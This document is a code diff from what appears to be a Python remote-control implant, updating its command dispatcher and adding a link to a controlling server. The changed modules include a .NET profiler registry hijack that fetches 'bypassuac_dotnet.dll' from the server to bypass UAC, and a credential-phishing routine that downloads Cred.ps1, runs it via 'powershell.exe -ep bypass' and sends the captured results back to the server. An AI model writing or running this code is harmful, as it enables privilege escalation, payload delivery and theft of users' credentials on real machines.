@@ -65,30 +65,24 @@ def enclosing(func):
             return 1, format_dict_with_index({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')})
         # 拆分函数参数
         name, arg = parse(arg_str)
-
         # 根据序号获取嵌套函数
         nested_funcs = {k: v for k, v in nested_funcs.items() if callable(v)}
+        nested_func = None
         try:
             index = int(name)
             nested_func = list(nested_funcs.items())[index][1]
-            # 获取嵌套函数参数个数
-            if len(inspect.getfullargspec(nested_func).args):
-                return nested_func(arg)
-            else:
-                return nested_func()
         except:
-            pass
-
-        # 根据嵌套函数名获取嵌套函数
-        if name in nested_funcs and callable(nested_funcs[name]):
-            nested_func = nested_funcs[name]
-            # 获取嵌套函数参数个数
+            # 根据嵌套函数名获取嵌套函数
+            if name in nested_funcs and callable(nested_funcs[name]):
+                nested_func = nested_funcs[name]
+        finally:
+            if not nested_func:
+                return 0, 'no such function: {}'.format(name)
+                # 获取嵌套函数参数个数
             if len(inspect.getfullargspec(nested_func).args):
                 return nested_func(arg)
             else:
                 return nested_func()
-        else:
-            return 0, 'no such function: {}'.format(name)
 
     wrapper.__signature__ = inspect.signature(func)
     return wrapper
@@ -125,6 +119,16 @@ def require_integrity(level):
 
 
 class Command:
+    server = None
+
+    @staticmethod
+    def pass_server(server):
+        Command.server = server
+
+    @staticmethod
+    def _cmdlist():
+        return 1, json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])
+
     @staticmethod
     @desc('show this help')
     def help():
@@ -367,10 +371,14 @@ class Command:
         @desc('.net profiler dll')
         @require_integrity('Medium')
         def clr():
-            filename = Path(EXECUTABLE_PATH).stem + '.dll'
-            if not os.path.isfile(filename):
-                return 0, 'File does not exist: {}'.format(filename)
-            dll_path = os.path.abspath(filename)
+            server = Command.server
+            filename = 'bypassuac_dotnet.dll'
+            dll_name = Path(EXECUTABLE_PATH).stem + '.dll'
+            if not os.path.isfile(dll_name):
+                if not server.request_file(filename):
+                    return
+                os.rename(filename, dll_name)
+            dll_path = os.path.abspath(dll_name)
             reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
             winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
@@ -519,7 +527,6 @@ ShortSvcName="flcVPN"
     @desc('prompt for credentials')
     @enclosing
     def cred(args):
-        """ 系统凭证钓鱼 """
 
         @desc('PSHostUserInterface.PromptForCredential')
         def pshostui():
@@ -538,16 +545,20 @@ ShortSvcName="flcVPN"
 
         @desc('CredentialPicker')
         def credpicker():
-            filename = os.path.abspath('Cred.ps1')
+            server = Command.server
+            filename = 'Cred.ps1'
             if not os.path.isfile(filename):
-                return 0, 'File does not exist: {}'.format(filename)
+                if not server.request_file(filename):
+                    return
+            filename = os.path.abspath(filename)
             p = subprocess.Popen(r'powershell.exe -ep bypass -file "{}"'.format(filename), stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, shell=True)
             stdout, stderr = p.communicate()
             if stderr:
-                return 0, stderr.decode(locale.getdefaultlocale()[1])
+                server.send_result(0, stderr.decode(locale.getdefaultlocale()[1]))
+                return
             lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
-            return 1, str(lines)
+            server.send_result(1, str(lines))
 
         @desc('switch to new desktop')
         def swdesk():
